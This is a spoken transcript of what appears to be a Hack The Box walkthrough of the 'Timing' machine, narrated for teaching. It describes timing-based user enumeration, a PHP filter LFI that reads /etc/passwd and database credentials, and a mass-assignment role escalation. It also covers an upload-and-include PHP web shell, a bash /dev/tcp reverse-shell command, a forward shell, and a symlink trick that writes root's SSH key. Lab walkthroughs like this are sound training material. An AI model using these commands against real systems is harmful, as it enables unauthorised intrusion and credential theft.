 what's going on youtube this is ipsec be doing timing from hack to box which is all about time attacks and oddly enough uh when i think of timing attacks i think of like um sql timing attacks which this box doesn't have any of thankfully because those attacks are got awful but it starts off with identifying valid users on a web application which is probably one of the most common vulnerabilities because how most website login processes go is you type a username in if it is a valid user then it attempts to validate the hash and if a user doesn't exist it just returns false and when applications don't just validate a blank hash then valid users take slightly longer because they have to do like a bcrypt hash which probably takes a hundred milliseconds so you can easily identify valid users that way happens on a lot of web applications once you get in then the next piece of the box after a mass assignment vulnerability is a file upload that part of the file name is dependent on the time you upload it so you have to reverse that and they can upload a shell and get a shell in the box but there's a lot more to it so let's just jump in as always we're going to start with the nmap so dash sc for default scripts sv enumerate versions oh a i'll put all formats put in the nmap directory and call it timing and then the ip address of 1010 11.135 this can take some time to run so i've already ran it looking at the results we have just two ports open the first one being ssh on port 22 its banner tells us it's an ubuntu server we also have http on port 80 and its banner tells us it's running apache also on ubuntu and we have some nmap scripts going off giving us the title of the page but most importantly this phps id which is the cookie it stands for php session id so we know this is going to be a php web application so let's just go navigate to it to see what it looks like and it gives us just a login form we can try basic things like admin admin or um admin guest and we don't really get anywhere so the next thing i always do is run a go buster or in this case i'm going to run ferro buster and the main reason i've been switching is i just want to try out a new new tool i don't like just sticking with one tool indefinitely every now and then i do switch and ferro buster does support recursion which is nice and um they just added an epi just ad i figured how to pronounce his name but he had added that feature for hunting for backup files that i had implemented in go buster so that is one of like my requirements for a web brute forcer so the first thing we have is uh dash x php because we want to add the php extension to everything then i do the dash b option and that's going to collect backups so anytime it finds a file it's gonna try to do like dot file dot swap or dot file dot um back it's gonna hunt for a bunch of things about that file that could make for a backup um so it's always handy because every now and then you'll find like some admin go on a wordpress box and edit the wp config manually and then leave them open you can grab his swap file of that and get the password potentially to wordpress that way so i always like having the collect backups option um and then the other thing i do for my first scan is dash n which disables the recursion because almost every app is gonna have like a javascript folder a css folder and when you start crawling those um it's easily gonna make your scan take like three to five times longer right so my first scan i just want to be quick and then i re-run it so right off the bat here we do see quite a few things um my eyes generally ignore the redirect so anything in orange i generally ignore those lines from first glance i see image.php it's nothing here and the reason why i'm ignoring the orange is we can see if we make a request to upload.php it immediately redirects us to login.php so it's not really that interesting to us because this function requires us to log in and we can't access it but this one isn't requiring us to log in so that's now become interesting to me uh login.php obviously doesn't redirect to login.php because that's meant for unauthorized users so you can log in uh header.php interesting enough does redirect to login.php but further does not so if we tried to access like photo.php we can see some type of weird junk it's not really disclosing anything too interesting maybe an email address but this is definitely not related to hack the box some other links that go nowhere the other one was image.php and this is returning nothing it's zero bytes so right off the bat it doesn't appear interesting but if we think of the function what image.php is probably doing it's probably meant to display images so you probably need to give this some type of argument so that's why i'm going to go into w fuzz so i'm going to do dash u put in the url then dash w for word list we're going to do opt set list discovery web content i want to say there's an api one there is api and i generally do like objects.text and before we go to the w we have to say where we want to fuzz so i'm going to do question mark because this is how we input parameters to a web page via get request now do fuzz is equal to etsy passwd the reason why i'm choosing etsy pass wd is because again we're assuming image.php tries to download an image or load an image off the server and this parameter here we're just trying to guess what that parameter name is to load an image so we start this quickly and we can do a um dash dash hw to hide everything with zero words and then we're just going to let this run to see if we ever get a request back that is greater than zero words and with w fuzz done we see it found the payload image uh gave us three words in 25 characters so let's go see what this does so if i do question mark image is equal to etsy past wd we get hacking attempt detected so we have some type of uh waff or something like that so i'm going to for this over to grip suite because it makes it a bit easier to play with this and we can figure out what is going on here so if i do image is equal to i'm just going to do please subscribe so this shouldn't have any bad characters we just get nothing so we need that etsy pass wd here well i'm gonna try etsy and we get hacking to attempt um if i do double slash etsy we get hacking to tempt so maybe it's just the word etsy no so it's something if the string begins i guess with slash etc it says hacking attempt detected so what i'm going to do is a php filter to see what happens here so we can do php filter slash convert i think it's dot base64 in code and then resource is equal to etsy passwd and we get some base64 back which is looking good so if i do echo dash n paste this in base64-d we get the output so one thing i did learn while doing this box is if you leave this whole convert thing off and just do php resources equal to it gives you the text here but if we wanted to try to extract source of the web app it's not going to work so the very first thing i would try doing is if we go back to ferro buster we have db underscore con.php which likely contains like database credentials so we always want to look at that so if i do this it's still going to do nothing we have to convert this into php into base64 so the server doesn't process the php so we do echo dash n actually let's just do it in this pane base64-d and we can see we got root and then very long password so um we have the user aaron here and i'm just glancing i don't see any other users so we only have two root that has been bash and then also aaron so what i'm going to do is just confirm this so i'm going to grab everything that ends in sh and we can see yes that is correct so we could try ssh aaron at 10 10 11 135 and put in this password and see if we get anywhere chances are we don't um you could try root but most the time root with the password login is disabled so that's never going to work um the port the box didn't have 3306 open to us so we can't try connecting to my sql but even if it did my sql generally has an acl around the ip address as well so we wouldn't be able to connect to it we just save this password and think about it later potentially so if we look at fair buster we can extract the source of anything and we only really know about login.php i mean we could look at upload.php but we can't really access this because it redirects us to login so i'm going to look at login and see if there's like an sql injection or anything like that so let's do login.php grab this source and then echo dash n base64-d i'm just going to direct it to login.php so i can vim it and this will give us syntax highlighting so we can also look at header.php that's generally a good one but because we also have db con header is not really that interesting to us anymore sometimes you'll find like header.php contains credentials but let's look at login this function create time channel is weird with the sleep function but we see the login and this is using a parameterized statement so that's not sql injectable because what it's doing is it's setting up username here and then having it execute like that so um this is always bound to only be used as it is we can't just inject other pieces of the sql um so if the user is false so what this is going to do is if the username is created then it's going to verify the password and do does this function which sleeps for one second so this is telling me we have to brute force user names um because there's now well even if this wasn't here there'd still be some type of delay for validating valid users i'm guessing the reason this create time channel exists is because it's they want to make it stand out more but generally whenever you verify a password it's going to take time because passwords are um hashed pretty well if the password if verifying the password doesn't take time then it's like md5 and it's insecure in the database so you always want to use like bcrypt but to validate a b crypt takes like 100 to 200 milliseconds which now you can validate valid users this is adding a full second to make it super obvious but if i go to this login form we can see what's happening so let's just disable intercept real quick so we can quickly get to where we want i'm going to log in with ipsec i'm going to do password right so if i go to burp suite intercept on we can send this to repeater and look at the time it takes we have a hundred like it's never greater than a hundred milliseconds right we're floating between like 95 and 100. if i change this to be admin now it's taking a while it took 1.169 and there are um a thousand milliseconds and a second so even if that sleep wasn't there it now took 0.169 milliseconds right and if admin's not there it's 99 so it's still taking like half a millisecond longer whenever there's a valid user even if we got rid of that sleep so this is an easy way to identify valid users of a web application that's in a lot of apps because this logic of um them checking if the user exists and then validating password is so common so um you'll find this in a lot of applications and i think it is generally um like bug bountiable as in you'll get money if you identify a way to identify valid users so always low hanging fruit and web apps like this i guess what we have to do now is find out other users of this box so i'm going to drop into python so we can just quickly write a script to find valid users so let's go and create a new script i'll call this usernoom.pi obviously the first thing we import is the request module so we can make request and i just do r is equal to request dot post and then the url http 1010 11.135 i believe and then we want to make a request to login.php then we put the data so this can be the post request it is user and then password so user is equal to admin and password is equal to please subscribe close that there we go i think that is good and then we could do like import pdb then pdb dot set trace and debug it because i want to go into this object the r to see um how long request takes but we can also just do python and then a dash i to go interactive afterwards and it all does the same thing so if i do r we have that object here um we can do d-i-r-r to see what it is and if we wanted to we could look through and see elapsed so r dot elapsed is going to be the time this request took there's also things like status code to get the status code text to get the page everyone's dealt with requests before but the main thing we want is elapsed so that is what i wanted so i'm going to just print our dot elapsed and then what we want to do is do a second request with a user that doesn't exist so we can see the time difference right and they are the same so something is wrong here um let's see there is a login equals true up here so let's try that if i do question mark login equals true and let's do it here run it again and we can see now it is taking longer so now we have a way to identify uh valid users so we can say um let's see i'm going to convert this to integer right and we can convert this to int because i don't want to do the whole time zone thing i just want to know milliseconds does that work no huh let's see i'm going to do the dash i again and i'm just going to assign x is equal to r dot elapsed and we have this so if i do dir x we can probably just do maybe x dot microseconds micro seconds there we go that's what we want so close out of this printr.elapse.micro seconds dot micro seconds now when we run this this is looking better right so we can say i'm going to put 2 2 here so that should give us plenty of leeway so v user enum and we can do if r dot elapsed dot micro seconds is greater than we'll say 2 2 1 2 3 this 4 here 1 2 3 4 2 3 4 print valid user so now if i run this we get that and if i put a invalid user we probably won't right so there we go our script works um we could make it take a word list but i'll leave that as an exercise for you because we already have an lfi to get usernames so what we're going to do is import sys and we can say data let's just copy this highlight cut put there we go and let's see ipsec we can just do sis.rgv1 is that how we do this print data is that going to work data is equal to data abc sweet that does work okay validuser ciscardv one okay this is a really horrible script but you should get the point we can say else okay invalid user so i do ipsec invalid user we do admin it's taking longer and we get valid user so this is a good way to brute force users and if we went back to the lfi oh god i just kept clicking x and deleted things uh can we undo uh reopen close tab oh we can't do it for twice so i lost the lfi um it was image and we just wanted what php filter resource is equal to drop there we go and the user we want is aaron so we can try aaron and we get a valid user so we can try basic passwords we could also brute force the password but we try aaron password uh invalid username we can try aaron aaron and we get in so now we are logged into this application as user 2. if we click on home nothing happens if we click edit profile we can edit this but i would check for like ssti here but even on home it's not telling us anything about our user right so um can't really do anything there we could start playing probably with the image upload so if i go to upload.php [Music] it still redirects us back here so do we still have fair buster up here we do and we can see upload.php we could probably download the source code to that um let's see if we go back to burp we want to do convert dot b64 encode i think that's right correct yep and what did we want to do um upload.php we can grab this base64 echo dash n base64-d to upload.php we can look at it and it's including an admin authentication check so um i guess only admins can access this upload feature we can download this source as well and see what this looks like echo dash n admin auth check.php uh probably should base64 decode it and it's just looking at roll so there's nothing really that we can do if we go back to edit profile i'm going to go on grip suite and let's see what this request looks like so i'm going to update send it in examine the results and what i'm seeing is some more fields so we only have first name last name email company but it's outputting quite a few more password and roll so we're roll zero and in that admin auth check it is saying hey we want the roll to be equal to one so this is a mass assignment vulnerability and we can set role equals to one potentially and see it did update it the reason why i didn't try any type of idor because we didn't specify our username here at all generally when you see like these apis you would try like updating the password of a different user but we can know it's pulling a username from our php session so we don't have the ability to change that we may be able to do like id equals one now and set that but who knows what that would do right so um i'll be happy just being roll one if we go to upload.php now we should be able to access it let's jump rip suite off and just says extension is not allowed so we can now upload things if we just go here we have an admin panel so we can also upload it there but i'm not done with this yet i want to look at this profile update.php to see how the mass assignment actually worked because we're here for learning right so let's go back to repeater we want this and we can paste that grab this source echo dash n base64-d [Music] and this is called profile underscore update dot php and i haven't actually looked at this code yet so let's see if i can spot the mass assignment so right now it's just looking for the required fields the four fields and how is it doing oh this is a lame way to show it they're actually setting the role even though wait post user is equal to user role oh yeah so it's checking so we could we couldn't update password or anything else this is like a ctf induced vulnerability i would say it's good for enumeration but when you discover how it works it's not really quote unquote realistic generally if this was a real mass assignment vulnerability the application would be doing something like sql is equal to select users where username is equal to and it gets the username from your php session right obviously it would use like prepared statements things like that to prevent that type of sql injection error but it'd be pulling this and then it would get the row and then update it so it would be like do some pseudo code code and it would be like take sql return combine with php input or something like that so none of the fields would be hard coded it would just be a looping around php input and combining them into this sql object and then calling a sql update if you want to look at a back end or this vulnerability more i would recommend like the back end to video but um enough time has been spent on that let's go play with image uploads so when we hit upload.php it told us the extension is not allowed so if we look at the source code let's look at upload.php and it will probably tell us what extensions are allowed right base64-d and i'll put this to upload.php we can look at it and we see a few interesting things so it's renaming our file so it's going to be file dot time underscore the file name it looks like so what is file hash unique id unique id i don't know what that is that's not coming out of auth check right that's probably a php function let's see php unique id i'm guessing this gets a unique thing based upon time maybe let's see prefix more entropy so it doesn't use it's not crypto secure prefix identify based upon the current time in microseconds so um [Music] it's going to md5 the file hash which is going to be unique id with the time and i guess both of these are related to time um so this should be we should be able to edit this right because if we look at this request whenever we do something it does return with the server time of the request so the only thing we need to do is expand this down to test for all microseconds within this second here and we should be able to generate this md5 sum which will be the file name and then let's see is set post extension and the extension has to be jpeg so this should be simple enough the question is we know we can store jpegs on the server um we can't edit the extension to be anything other than jpg so if we just drop something in like upload shell.jpg it's not going to execute so let's look at our lfi vulnerability and i'm gonna look at image.php and i already know this because when i didn't do this convert it actually loaded the page so this is going to be probably doing a require right so if i look at this code we can just do image.php we can see or not require include it is including if like any image display script should have been like a file get i think contents it should have been that instead of include because if it was then we would would not be able to do remote code execution but include is going to um execute any php it finds so we're going to do the include and put it tied to our file name and we want to execute code out of a jpeg file so let's take a look at the upload again and go to what we have to do to generate so we pretty much have to replicate this function and the one thing that's sticking out to me right now this md5 so we have to replicate this md5 time whatever but um the file hash is in single quotes so we may not have to replicate unique id because it may be md5ing like file hash like the string so we may get lucky there because i don't think we can input a parameter to unique id which would make this a bit trickier so i'm just going to do a is equal to unique id i just did php dash a to get into interactive mode so if i um i guess we have to echo a we can see that's what the value of unique id is but if i echo a in single quotes it's just a right so if we echo md5 um single quote a like this this is doing an md5 against the string a so if we updated the unique id and i do this again it's still going to be the same value so we actually don't have to replicate unique id which is good because if we do unique id on the php man page there's no way we can easily just input what time we want and it goes down to microseconds if we look at this time command i guess we have to echo this is standard epoch this is going down to seconds not microseconds uh if we do um epoch time converter we can just see the current time one six eight five so if we echo this we can see the length is the same and this is not going down to microseconds so we don't have to like create a big like fancy word list because the timestamp that the server is giving us should be the same um i think there's like even a str to time or something let's see if we do this can i echo str2 time like this yeah so like we can even convert the timestamp out of a request straight here and then i think it's underscore whatever and this is getting put into upload directory and upload dir is images uploads so let's try this real quick um i'm just going to v we're going to call it shell.php and i didn't see any actual checks in the file type so i don't have to like put this in the exif data mime type or anything of that of an image i should be able just to upload raw php so let's do request and i'll call it cmd like this okay so we have a php shell so let's go back to our admin so if we just hit this uh let's log in with aaron aaron i wonder if we're still an admin we are not so something auto-reverted us but no worries we can just edit the role again manually refresh oh this is probably an old cookie so we gotta edit the profile and do this again so intercept that's the wrong request submit and roll is equal to one forward profile updated refresh this page admin panel this is what we wanted so let's go to um htb timing shell.php and upload this i definitely want to make it go into burp suite so we get the exact time this uploads so put in repeater so we can see the request easily this extension is not allowed oh we called it php it's jpeg right so shell.jpg file has been uploaded and we have the timestamp here so let's convert this to a time stamp so php dash a we want to do md5 then file underscore dot str to time and we gotta put this in quotes okay and then close this off we want to echo it and hopefully this is going to be the md5 of a file so if i go to we can take burp suite off it was slash images slash upload or uploads maybe yeah forbidden and then paste that hash and then underscore shell.jpg and we see something here if we did a different hash like this it's not found so we calculate it right the first time and all we have to do is cmd is equal to ls i'll probably have to view the source because come on um so what's happening here is the mime type the server's returning it's saying it's an image so a browser is trying to display the output of this i could probably do like view dash source colon maybe not let's just put this to prep suite right go to burp suite intercept refresh let's get rid of the view source is there burp suite not configured to intercept images i think i passed it here we go content type matches uh text if we disable that will it now intercept let's see content type header can we edit this match condition let's see oh this is server responses uh here we go uh we want client and we want to probably remove the jpeg so if we remove this there we go refresh now we're in burp suite and i can go to intercept center repeater and oh of course uh we can't just execute our script because it's jpeg and the server is not executing it but remember we did have the um image.php so if we do get slash image.php and then the argument was img so let's try this we can say and cmd equals ls there we go so i wonder if we can put this down below so cmd equals ls we can so we can only use the um get variables but remember this is because we had the lfi that use the include and we're just putting the path to where the image is so we could do a reverse shell now so bash dash c bash dash i dev tcp 10 10 14 8 9001 then we want to url encode this whole thing actually zero and 1. there we go now i want to url and code the whole thing and i'm just going to do encode all characters because when doing it in the get header i find encode all characters to be a bit more lenient when it comes to bad characters and it still does not look like it worked let's see bash.c bash dash i devtcp 1010148 that is certainly my ip address so something's wrong there let's just put a base64 cradle so bash dash c i dev tcp 10 10 14 8 9 000 1 0 and 1 like that and then we want to base 64w 0 and i always like getting rid of the pluses and equal signs so i'm just putting spaces where they exist and we get just a complete alpha numeric base64 string so we can try this one so here now the command can just be echo dash n base64-d bash and there's really no bad characters here so i can just do control u to encode it and we still don't get a hit um is something wrong let's see command is equal to ls so that works i don't know why this doesn't i'm going to try this does this just get me out of a shell or myself i do so let's see make dirt dub dub dub actually let's try curl curl 10 10 14 8 9 000 1. http something's telling me i can't get back to my box on this so let's try just 10 10 14 8. so what if we have some type of firewall preventing reverse shells because this one definitely should have worked um ton 0 i'm definitely 10 10 14 8. if we try w get nothing so we may be stuck with this we may be able to do like a forward shell but i'm still confused by this and the last thing i want to try is just testing out um which curl to make sure we actually have curl on the box which we do so i am 99 sure there is a firewall between us and the best way to go around that when we have code execution is using a forward shell so if i go to um my github so github.com ipsec and we go to forward shell we have a python script that should help us so i'm going to git clone this and then we'll edit this to hopefully work right so get clone put it in directory and we just added it um so what this does it sets up a bash terminal in the background and that just reads from a file and writes output to another file so we can have a persistent session that doesn't depend on the network if you want more information about it you can go to ipsec.rocks which is probably the best place to do it because while i didn't create this technique it kind of existed before um i don't know if anyone's done it the way i did with um this like as we're about to explain through just uh named pipes and shells in a python script so the circa video is by far the best video to watch to go over it and you can watch me do it in multiple iterations throughout so um there are two things we have to modify the very first thing is going to be the url so this is 1010 11.135 and then we want to do what is it image.php because we're executing off of this and then on the run raw command that's going to be where we add this stuff so we can go all the way down to let's see here and if we read the comments this run raw command is currently based off of shell shock so it's just putting the payload and the user agent so we're going to modify this slightly so the payload is going to be [Music] essentially this so let's do this with an f string so we're going to append a shell file to all a request and then ncmd we can just put cmd there so now we can just do self.url plus payload and get rid of the headers because this is not shell shock anymore and i still like it going through burp suite because it's handy to debug so that hopefully is it um let's make sure burp suite is not set to intercept intercept is off so if we python 3 forward shell we can do pwd and it doesn't look like it's working which is a shame but we can turn intercept on run it again and see the commands it is doing so this very first command looking at it let's see i can see the issue it's kind of what i thought the issue would be um give you a second to look at my cursor is by it if we decode this so let's go to decoder smart decode it didn't encode this ampersand so if i go back here we can go in the proxy so that's not url encoded so what just happened is this is an argument separator and the get request so the only thing that got sent was up to this first and most likely so if i go to decoder we look at it smart decode it just stopped there so it never wrote or output file so if i go in burp suite and we highlight where that ampersand is we right click and we want to convert selection url all characters that is percent 26. so if i for this and now we run it let's see if it works it now works because it set up the output file so let's go fix this real quick in the script so forward shell let's go down to the payload whereas run raw command here it is i think i can just oh that's not it um [Music] here so this make named pipes if i put this to be percent 26 i think everything will work so intercept is off we set it up to pwd and yes we have a shell so if i just type the upgrade command this will give us a like tty so now i could do like pseudo dash l if i wanted to but i'm just going to do who am i we're dub dub dub data that also told us it here so let's see do it lsla see what we have i don't know what that file one is it was created by us i believe if i cat one that is output to curl so let's see what else is there doesn't look like anything in here i mean we've already seen dbcon.php right so um if we go to slash home maybe aaron's directory is readable so we go in aaron see if there's anything here permission denied if we go to the op directory see if there's anything here we have source files backup.zip so we do have something here we can just easily download that with our lfi right so if i go back here this image thing let's see images upload i just want image dot php image is equal to i'm going to do op source files if this downloads hacking attempt detected that is annoying uh php convert i know it's php filter and i can just do resources equal there we go so we can just download this file now so wget actually i'm going to make the zip w get this file and it is downloading let's just move it to filesbackup.zip run a file against it it is indeed a zip we can unzip it and there is a backup directory and when i unzipped it the thing i noticed is get so if we do get log we can see [Music] grumpy and there's two commits db connection updated so if i do a get diff on this we can see there is an old password so let's try ssh the only users on this box was aaron and root so that's why i'm trying aaron first so aaron at 10 10 11 135 put in the password and we get logged in with ssh so i can do sudo l and i can see aaron can run this net utils binary as root so if i do a strings against user bin net utils uh strings not found let's see let's just execute it so sudo user bin net utils we got ftp http and nothing i'm going to try http so i am still listening netcat there i'm just going to move netcat here sudo lvnp and we can say http 101014 8 and what we get is a request and the user agent is axel so i'm going to do a search ploy against axel see if we get anything um this is a cms i really don't think it's that so we'll google this string so axle like this maybe we add exploit in the name see new security issue see seems like there's a vulnerability we haven't found details yet for it though um slc tls implementation lacks hostname validation i don't think that one would be it um let's see cve database maybe look at cves uh let's see search cve list axle c it's not momentum right and probably not that i don't think it's hostname validation i guess we could see if it actually downloads it so um let's make do dub dub dub and then we'll echo please subscribe to test.text i said text.text there we go uh python3 http server and then specify url http 101011 1010 14 8 test.text we have to specify port 8000 so 1 8 000 test.txt and it says it downloaded and we have the file and it's owned by root so we can probably just overwrite the authorized key so if i create a sim link do root ssh authorized keys and i'm going to call it um ipsec so now if i trick this into writing to the file ipsec it'll direct me into authorized keys so let's try ssh key gen uh we'd need to specify f and just call it ipsec and then move ipsec to ipsec.pem and i did not think this through ipsec.pub to just ipsec there we go so let's now start a simple http server or http server and try this again so let's do sudo net utils download hdp 10 10 14 8 put 8 000 ipsec it says it downloaded and if we now chmod 600 ipsec dot pem let's try ssh with this root at 10 10 11 135 and we get in so um let's see what exactly axl is so axle is just a download accelerator i guess um so the script lets us download files as root and we trick it into writing an ssh key so hope you guys enjoyed that video and as always sorry for this abrupt cut but as i was editing i realized there was one more piece i wanted to show and that is the um timing attack on identifying users uh there was if we go to um login dot php we have this sleep right here right and this is making the um user enumeration super obvious even if we remove that sleep though the vulnerability still exists and the only way to remove this vulnerability is if the user is false to also do a password verify function against the same type of hash so you're still computing a hash so there's no timing difference so i just removed the sleep on this login request right and if we go to repeater now watch me be proven wrong but i mean i don't think i am so if we look at this we're at 160 some milliseconds 150 to 160 right with admin we put another user we're down to the 90s right so all that um sleep did was make this more obvious and more friendly to people with um odd connections like if you don't have a strong connection to hack the box latency can make these type of attacks difficult but as you can see it's definitely visible and we could easily just look for if it's ever probably above 120 milliseconds then we assume it is bad um another thing that could be affecting this is like on release night 20 people doing logins they could just hammer the box and make it slow so that's why i believe there's the full second delay but that isn't actually needed for this to be vulnerable so hope you guys enjoyed the video take care and i will see you all next time